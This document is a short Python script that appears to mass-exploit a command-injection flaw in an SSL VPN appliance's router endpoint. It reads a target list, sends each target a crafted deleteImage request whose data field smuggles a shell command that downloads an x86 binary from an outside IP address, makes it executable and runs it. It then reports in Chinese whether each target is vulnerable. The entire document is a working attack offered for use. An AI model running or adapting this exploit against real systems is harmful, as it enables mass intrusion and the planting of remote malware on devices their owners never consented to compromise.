import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import json
import requests
import threading
import queue

class Mythread(threading.Thread):
    def __init__(self,queue):
        super(Mythread,self).__init__()
        self.queue = queue

    def run(self):
        while True:
            if self.queue.empty():
                print("批量上传完毕")
                break
            target = self.queue.get(timeout=1)
            self.Poc_check(target)

    def Poc_check(self,target):
        try:
            target1 = target+"/directdata/direct/router"
            headers={
                    'Content-type': 'application/json',
            }
            data = json.dumps({"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;curl -O http://144.172.73.12/x86;chmod 777 x86;./x86 rip >/var/www/html/ab5.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="})
            r = requests.post(target1,headers=headers,data=data,verify=False,timeout=8)
            if r.status_code == 200 and "SSLVPN_Resource" in r.text:
                print(target+"		"+"漏洞存在！")
                print("请访问："+target+"/ab4.txt")
            else:
                print(target+"漏洞不存在!")
        except Exception as e:
            print("请求失败")

if __name__ == '__main__':
    
    youxiangs = open("wk.txt","r")
    threads_count = 10 #设置线程
    threads = []
    Queue = queue.Queue()
    for i in youxiangs.readlines():
        url = i.strip()
        if url[:4] != "http":
            url = "https://"+url
        Queue.put(url)
    for i in range(threads_count):
        threads.append(Mythread(Queue))
    for i in threads:
        i.start()
    for i in threads:
        i.join()
    Queue.join()
  
            
